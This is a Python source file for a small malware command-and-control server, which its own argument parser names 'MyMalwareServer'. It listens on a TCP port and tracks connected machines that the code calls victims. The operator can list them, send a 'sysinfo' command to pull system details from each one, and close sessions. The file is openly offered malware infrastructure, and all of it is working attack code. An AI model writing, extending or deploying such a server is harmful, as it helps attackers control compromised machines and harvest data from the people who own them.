import argparse
import socket
import json
import threading
import signal
from pprint import pprint

from sock_helper import send_msg, recv_msg


class Server:
    def __init__(self, address):
        self.__sockets = []
        self.__sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.__sock.bind(address)
        self.__sock.listen(0)

        print(f"Listening on {address[0]}:{address[1]}")

    def handle_connections(self):
        while True:
            connection, address = self.__sock.accept()
            print(f"==> {address[0]} connected on port {address[1]}")
            self.__sockets.append(connection)
            self.__print_peers()
    
    def __print_peers(self):
        print("="*20)
        peers = [f"{s.getpeername()[0]}:{s.getpeername()[1]}" for s in self.__sockets]
        if len(peers) < 1:
            return
        
        print("Type sysinfo/close and number to get the info or close the session")
        for i, p in enumerate(peers):
            print(f"\t[{i + 1}] {p}")
    
    def __get_info(self, number):
        victim_socket = self.__sockets[number]
        send_msg(victim_socket, 'sysinfo'.encode('utf-8'))
        victim_info = json.loads(recv_msg(victim_socket).decode('utf-8'))
        pprint(victim_info)
        self.__print_peers()
    
    def __close_conn(self, number):
        self.__sockets[number].close()
        self.__sockets.pop(number)
        self.__print_peers()

    def handle_input(self):
        while True:
            command = input().split()
            if command[0] == 'sysinfo':
                self.__get_info(int(command[1]) - 1)
            elif command[0] == 'close':
                self.__close_conn(int(command[1]) - 1)
    
    def close_server(self, sig, frame):
        [s.close() for s in self.__sockets] 
        self.__sock.close()
        exit(0)



if __name__ == '__main__':
    parser = argparse.ArgumentParser(
        prog="MyMalwareServer", allow_abbrev=False)

    parser.add_argument('-s', '--server', type=str, action='store',
                        default='0.0.0.0', metavar='Server address')
    parser.add_argument('-p', '--port', type=int,
                        action='store', default=5000, metavar='Port number')

    args = parser.parse_args()

    server = Server((args.server, args.port))
    signal.signal(signal.SIGINT, server.close_server)
    conn_thread = threading.Thread(target=server.handle_connections, daemon=True)
    conn_thread.start()

    server.handle_input()
